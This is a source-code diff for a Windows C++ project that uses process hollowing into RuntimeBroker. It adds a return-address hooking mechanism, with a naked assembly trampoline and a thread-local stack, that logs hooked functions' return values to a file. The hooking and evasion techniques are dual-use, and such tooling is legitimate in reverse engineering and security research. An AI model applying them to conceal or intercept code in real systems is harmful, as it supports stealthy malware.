@@ -3,6 +3,7 @@
 #include <iostream>
 #include <string>
 #include <fstream>
+#include <stack>
 
 #include <windows.h>
 #include <string>
@@ -10,6 +11,74 @@
 
 #include "process_hollowing.h"
 #include "exe_binary.h"
+
+// Struct for the return address hook
+struct ReturnHookInfo {
+    void* realRetAddr;
+    const char* funcName;
+};
+
+// Thread local stack for nested function calls in the same thread
+thread_local std::stack<ReturnHookInfo> RealReturnAddresses;
+
+// Called by the proxy to setup the hook before jumping to original
+extern "C" void* SetupReturnHook(void* realRetAddr, const char* funcName) {
+    RealReturnAddresses.push({realRetAddr, funcName});
+    extern void GenericReturnHookASM();
+    return (void*)GenericReturnHookASM;
+}
+
+// Called by the GenericReturnHookASM
+extern "C" void* HandleGenericReturn(void* returnValue) {
+    if (RealReturnAddresses.empty()) return nullptr;
+
+    ReturnHookInfo info = RealReturnAddresses.top();
+    RealReturnAddresses.pop();
+
+    std::ofstream logFile;
+    logFile.open("dll_logs.txt", std::ios::app);
+    if (logFile.is_open()) {
+        logFile << "[RET ] " << info.funcName << " returns: " << returnValue << std::endl;
+        logFile.close();
+    }
+
+    return info.realRetAddr;
+}
+
+// Hook ASM function definition
+extern "C" __attribute__((naked)) void GenericReturnHookASM() {
+    asm volatile (
+        "push %rax\n\t"
+        "push %rdx\n\t"
+        "push %r8\n\t"
+        "push %r9\n\t"
+        "push %r10\n\t"
+        "push %r11\n\t"
+
+        "sub $16, %rsp\n\t"
+        "movdqu %xmm0, (%rsp)\n\t"
+
+        "mov 56(%rsp), %rcx\n\t"
+        "sub $32, %rsp\n\t"
+        "call HandleGenericReturn\n\t"
+        "add $32, %rsp\n\t"
+
+        "mov 56(%rsp), %r11\n\t"
+        "mov %rax, 56(%rsp)\n\t"
+        "mov %r11, %rax\n\t"
+
+        "movdqu (%rsp), %xmm0\n\t"
+        "add $16, %rsp\n\t"
+
+        "pop %r11\n\t"
+        "pop %r10\n\t"
+        "pop %r9\n\t"
+        "pop %r8\n\t"
+        "pop %rdx\n\t"
+        
+        "ret\n\t"
+    );
+}
 
 std::vector<unsigned char> GetRuntimeBrokerPath() {
 	wchar_t buffer[MAX_PATH];
@@ -80,7 +149,7 @@ extern "C" void FakeFunctionCall(const char* fakeFunctionName, void* arg1, void*
                 << " (arg1: " << arg1 
                 << ", arg2: " << arg2 
                 << ", arg3: " << arg3 
-                << ", arg4: " << arg4 << ")" << std::endl;
+                << ", arg4: " << arg4 << ", ...)" << std::endl;
         logFile.close();
     }
 }
